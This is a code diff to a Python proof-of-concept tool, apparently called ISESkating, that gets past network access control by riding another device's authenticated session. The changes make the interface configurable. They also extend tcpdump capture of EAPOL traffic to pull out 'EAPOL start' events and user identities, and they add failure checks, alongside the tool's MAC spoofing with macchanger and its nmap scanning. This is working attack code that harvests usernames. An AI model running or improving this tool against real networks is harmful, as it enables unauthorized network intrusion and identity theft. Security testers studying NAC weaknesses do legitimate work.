@@ -5,6 +5,18 @@ import os
 from datetime import datetime
 import time
 
+##########################################################################
+# ISESkating was made by marantral infiltration.jedi@gmail.com           #
+# with Abricto Security abrictosecurity.com. This is a POC for           #
+# riding NAC authentication. If you want to run this as a service        #
+# you will need to copy the iseskate.service to the /etc/systemd/system/ #
+# then enable it on boot. This POC has been tested on Unbuntu and Debian #
+# based operating systems.                                               #
+# Here you will just need to set the interface that you want to use.     #
+##########################################################################
+
+face = "eth0" # Change to the target interface that has NAC that you are trying to bypass.
+
 try:
     os.makedirs("/usr/share/iseskate/")
 except OSError:
@@ -54,7 +66,7 @@ def iptables_del():
 
 # Change MAC and add routes
 def mac_route(mac):
-    macs = "ifconfig eth0 down; macchanger --mac=" + mac + " eth0; ifconfig eth0 up"
+    macs = "ifconfig " + face + " down; macchanger --mac=" + mac + " " + face + "; ifconfig " + face + " up"
     subprocess.call(macs, shell=True)
 
 
@@ -66,7 +78,7 @@ def ip_add(net, tip):
     except:
         pass
 
-    set_temp = "ifconfig eth0 " + tip + " netmask 255.255.255.0"
+    set_temp = "ifconfig " + face + " " + tip + " netmask 255.255.255.0"
     subprocess.call(set_temp, shell=True)
 
     nmap_scan = nmap.PortScanner()
@@ -107,22 +119,31 @@ def ip_add(net, tip):
 
     set_ip = random.choice(diff)
 
-    main_ip = "ifconfig eth0 " + set_ip + " netmask 255.255.255.0"
+    main_ip = "ifconfig " + face +" " + set_ip + " netmask 255.255.255.0"
     subprocess.call(main_ip, shell=True)
 
 
 # Packet EAP Capture
 def eap_capture():
-    tcc = "tcpdump -i eth0 -c 2 -e ether proto '0x888e' -tttt  >> " + eapf + ".eap.txt"
+    tcc = "tcpdump -i " + face + " -c 2 -e ether proto '0x888e' -tttt -v  > " + eapf + ".eapcap.txt"
     subprocess.call(tcc, shell=True)
+    tcc1 = "cat " + eapf + ".eapcap.txt  >> " + eapf + ".eap.txt"
+    subprocess.call(tcc1, shell=True)
 
+    eaps = "cat " + eapf + ".eap.txt | grep 'EAPOL start' > " + eapf + "EAPOL_START.txt"
+    subprocess.call(eaps, shell=True)
+    user = "cat " + eapf + ".eap.txt | grep 'Identity:' >> " + pcapf  + "EAPOL_users.txt"
+    subprocess.call(user, shell=True)
 
 def eap_check():
     try:
-        tcc = "tcpdump -i eth0 -c 2 -e ether proto '0x888e' -tttt  >> " + eapf + ".eap.txt"
+        tcc = "tcpdump -i " + face + " -c 2 -e ether proto '0x888e' -tttt -v > " + eapf + ".eapcheck.txt"
         subprocess.call(tcc, shell=True, timeout=70)
     except:
         pass
+    tcc1 = "cat " + eapf + ".eapcheck.txt  >> " + eapf + ".eap.txt"
+    subprocess.call(tcc1, shell=True)
+
 
 # Identifying IP
 def ip_capture(mac):
@@ -130,10 +151,10 @@ def ip_capture(mac):
     subprocess.call(clean, shell=True)
 
     while True:
-        collect_ip = "tcpdump -i eth0  -c 10 ether src " + mac + " -n  > " + ipf + "tcp.txt"
+        collect_ip = "tcpdump -i " + face + " -c 10 ether src " + mac + " -n  > " + ipf + "tcp.txt"
         subprocess.call(collect_ip, shell=True)
 
-        clean_ip = "cat " + ipf + "tcp.txt | grep ' IP ' | egrep -v '0.0.0.0' | cut -d '.' -f 2,3,4,5 | cut -d ' ' -f 3 | uniq >" + ipf + "hostip.txt "
+        clean_ip = "cat " + ipf + "tcp.txt | grep ' IP ' | egrep -v '0.0.0.0' | egrep -v '169.254.' | cut -d '.' -f 2,3,4,5 | cut -d ' ' -f 3 | uniq >" + ipf + "hostip.txt "
         subprocess.call(clean_ip, shell=True)
 
         if os.stat(ipf + "hostip.txt").st_size != 0:
@@ -168,8 +189,8 @@ def main():
             with open(eapf + '.eap.txt', 'r') as eap:
                 lines = eap.readlines()
             for line in lines:
-                if 'EAP' in line:
-                    mac_get = "cat " + eapf + '.eap.txt | grep "EAP" | cut -d " " -f 3 | uniq > ' + eapf + ".mac"
+                if 'EAPOL start' in line:
+                    mac_get = "cat " + eapf + '.eap.txt | grep "EAPOL start" | cut -d " " -f 3 | uniq > ' + eapf + ".mac"
                     subprocess.call(mac_get, shell=True)
 
                     with open(eapf + ".mac", "r") as file:
@@ -191,7 +212,7 @@ def main():
                     iptables_del()
                     while True:
                         eap_capture()
-                        time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2 | uniq > " + eapf + ".t_time"
+                        time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2 | egrep -v 'Type' | uniq > " + eapf + ".t_time"
                         subprocess.call(time_file, shell=True)
                         times1 = open(eapf + ".t_time", "r")
                         lines = [i for i in times1.readlines() if len(i) > 0]
@@ -225,8 +246,13 @@ def main():
                         if e_time > seconds:
                             control += 2
                             eap_check()
-                            time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2,3 | uniq > " + eapf + ".time"
+                            time_file = "cat " + eapf + ".eap.txt | cut -d ' ' -f 1,2 | cut -d ':' -f 1,2,3 | egrep -v 'Type' | uniq > " + eapf + ".time"
                             subprocess.call(time_file, shell=True)
+
+                            checkfile = open(eapf + ".eapcheck.txt", "r")
+                            if 'Failure' in checkfile.read():
+                                start_over == "5"
+                                break
 
                             check = open(eapf + ".time", "r")
                             lines = [i for i in check.readlines() if len(i) > 0]
